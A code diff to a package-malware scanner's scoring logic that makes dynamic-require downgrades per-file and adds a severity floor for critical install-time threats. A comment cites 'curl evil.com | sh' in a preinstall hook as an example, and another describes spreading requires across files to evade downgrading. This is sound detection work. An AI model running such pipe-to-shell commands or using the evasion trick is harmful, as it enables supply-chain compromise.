@@ -177,9 +177,21 @@ function applyFPReductions(threats, reachableFiles, packageName) {
   // Threshold raised from >1 to >4 (audit fix: >1 was trivially exploitable).
   const pluginLoaderCount = (typeCounts.dynamic_require || 0) + (typeCounts.dynamic_import || 0);
   if (pluginLoaderCount > 4) {
+    // Per-file: only downgrade in files that individually exceed threshold
+    // Prevents attacker from distributing 5+ requires across files to downgrade all
+    const perFilePluginCount = {};
+    for (const t of threats) {
+      if (t.type === 'dynamic_require' || t.type === 'dynamic_import') {
+        const f = t.file || '(unknown)';
+        perFilePluginCount[f] = (perFilePluginCount[f] || 0) + 1;
+      }
+    }
     for (const t of threats) {
       if ((t.type === 'dynamic_require' || t.type === 'dynamic_import') && t.severity === 'HIGH') {
-        t.severity = 'LOW';
+        const f = t.file || '(unknown)';
+        if (perFilePluginCount[f] > 4) {
+          t.severity = 'LOW';
+        }
       }
     }
   }
@@ -199,7 +211,7 @@ function applyFPReductions(threats, reachableFiles, packageName) {
       // vm_code_execution: full bypass — packages with only vm.Script calls (cassandra-driver,
       // webpack, jest) are legitimate. Real malware using vm always has other signals
       // (network, fs, obfuscation). The >3 count threshold is sufficient protection.
-      if (typeRatio < 0.5 ||
+      if (typeRatio < 0.4 ||
           (t.type === 'suspicious_dataflow' && typeRatio < 0.8) ||
           t.type === 'vm_code_execution') {
         t.severity = rule.to;
@@ -296,7 +308,12 @@ function calculateRiskScore(deduped) {
   }
 
   // 4. Compute package-level score (typosquat, lifecycle, dependency IOC, etc.)
-  const packageScore = computeGroupScore(packageLevelThreats);
+  let packageScore = computeGroupScore(packageLevelThreats);
+  // Floor: CRITICAL package-level threats (lifecycle_shell_pipe, IOC match) → minimum HIGH (50)
+  // A single "curl evil.com | sh" in preinstall = 25 points = MEDIUM without floor.
+  if (packageScore >= 25 && packageLevelThreats.some(t => t.severity === 'CRITICAL')) {
+    packageScore = Math.max(packageScore, 50);
+  }
 
   // 5. Cross-file bonus: aggregate signal from non-max files
   // A package with 3 files each scoring 20 is more suspicious than 1 file scoring 20.
